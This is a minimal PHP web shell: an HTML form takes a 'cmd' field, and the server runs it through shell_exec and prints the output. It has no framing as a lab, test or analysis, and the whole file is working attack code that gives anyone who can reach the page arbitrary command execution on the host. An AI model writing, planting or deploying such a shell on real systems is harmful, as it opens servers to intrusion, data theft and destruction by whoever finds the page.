<form method="POST">
<input type="text" name="cmd">
<input type="submit" value="submit">
</form>

<?php
$ot=shell_exec($_POST['cmd']);
echo $ot;
?>

